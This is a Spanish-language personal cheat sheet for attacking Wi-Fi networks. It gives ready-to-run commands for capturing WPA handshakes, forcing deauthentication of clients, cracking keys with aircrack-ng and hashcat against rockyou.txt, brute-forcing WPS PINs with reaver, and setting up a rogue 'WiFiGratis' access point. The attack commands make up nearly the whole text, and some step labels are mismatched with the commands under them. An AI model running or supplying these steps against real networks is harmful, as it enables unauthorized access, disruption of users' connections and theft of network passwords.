PENTESTING WIFI

AIRCRAFT -AIRDUMP 

-APAGA LA INTERFAZ
sudo ifconfig wlan0 down
- ENCIENDE LA INTERFAZ
sudo airmon-ng start wlan0




- PONER MODO MONITOR

sudo airodump-ng wlan0mon

-BUSCAR LAS REDES 

sudo airodump-ng wlan0mon

BSSID: la dirección MAC del punto de acceso.
ESSID: el nombre de la red.
Cifrado (ENC): el tipo de cifrado utilizado (WEP, WPA, WPA2).
Canal (CH): el canal en el que se transmite la red.

- ELECCION RED A ANALIZAR

sudo airodump-ng --bssid [BSSID] --channel [CH] --write captura wlan0mon

guarda la info en archivo captura

SI NO HANDSHAKE, FORZARLO

sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon


-HASHEAR CONTRASEÑA

sudo aircrack-ng -w [ruta_diccionario] -b [BSSID] captura-01.cap

 archivo .cap es el archivo que generaste con airodump-ng que contiene el handshake.


-UNA VEZ CON .CAP

COMPROBACION DE LOS ARCHIVOS SI HANDSHAKE

- HASHEAR CON DICCIONARIO
aircrack-ng -w [ruta_del_diccionario] -b [BSSID] captura-01.cap

. SI PIDE QUE PARA CONTINUAR UN DICCIONARIO -W

aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 7A:5A:B0:2C:4F:AC captura-02.cap

-Ataques contra WPS (Wi-Fi Protected Setup)
 PIN WPS y, en consecuencia, la contraseña WPA/WPA2.

sudo reaver -i wlan0mon -b [BSSID] -vv


OTRAS FUNBCIONALIDADES

- campturar trafico para posterior analaisis

sudo tcpdump -i wlan0mon -w captura.pcap

- crear un punto de acceso trampa 

sudo airbase-ng -e "WiFiGratis" -c 6 wlan0mon

escaneo pasivo de la red

sudo airodump-ng wlan0mon

INFO:

EAPOL (Extensible Authentication Protocol Over LAN): Si estás atacando una red WPA/WPA2 mediante el handshake, verás referencias a los paquetes EAPOL, que forman parte del proceso de autenticación entre el cliente y el punto de acceso. Estos paquetes son esenciales para romper la clave utilizando herramientas como Aircrack-ng o Hashcat.
.ivs: Es un archivo que contiene los vectores de inicialización de paquetes encriptados (IVs), especialmente en ataques a redes WEP. Aunque WEP está obsoleto,

METODOS DESCICFRADO:

DESCIFRAR .PCAP(HANDSHAKE) O POR PMKID
El PMKID (Pairwise Master Key Identifier) es un identificador que se puede capturar en ciertos routers WPA/WPA2 al momento de autenticarse. El PMKID se utiliza para intentar descifrar la contraseña de la red Wi-Fi sin necesidad de capturar el handshake completo. Es común que se encuentre en redes que soportan RSN (Robust Security Network).Puede ser utilizado para intentar romper la contraseña de la red:
1.- convertir el archivo .cap con PMKID a un formato que Hashcat pueda procesar (hcxpcapngtool -o pmkid.hccapx movi-02.cap) o si da error: pasarlo a formato hccapx (22000 hashcat) hcxpcapngtool -o hashfile.22000 movi-02.cap

2.- Ahora que tienes el archivo pmkid.hccapx, puedes usar Hashcat para intentar romper la contraseña(hashcat -m 16800 pmkid.hccapx /ruta/diccionario.txt o hashcat -m 22000 hashfile.22000 /usr/share/wordlists/rockyou.txt, según el caso)
HANDSHAKE
1.- asegurarte de que el archivo .cap contiene un handshake válido(aircrack-ng movi-01.cap)
2.- intentar descifrar la contraseña con un diccionario de contraseñas(aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] movi-01.cap)
3- RESULTADO:
KEY FOUND! [ contraseña ]
Master Key     : [clave maestra]
Transient Key  : [clave transitoria]

dict.-  /usr/share/wordlists/rockyou.txt









 